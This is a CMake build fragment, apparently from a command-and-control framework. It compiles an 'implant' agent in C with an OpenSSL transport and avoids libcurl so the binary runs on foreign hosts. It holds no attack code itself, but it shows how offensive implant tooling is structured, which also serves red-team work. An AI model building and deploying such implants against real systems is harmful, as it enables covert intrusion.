# The implant is C plus a small OpenSSL transport; it deliberately does not
# link libcurl, whose 35-odd shared dependencies do not exist on a foreign host.
add_executable(agent agent.c https_client.c)
set_target_properties(agent PROPERTIES
    C_STANDARD 17 C_STANDARD_REQUIRED YES C_EXTENSIONS NO)
# Needed for popen/pclose, nanosleep and getaddrinfo with a strict -std=c17
# (no GNU extensions).
target_compile_definitions(agent PRIVATE _POSIX_C_SOURCE=200809L)
target_link_libraries(agent PRIVATE
    c2_common project_warnings OpenSSL::SSL OpenSSL::Crypto)
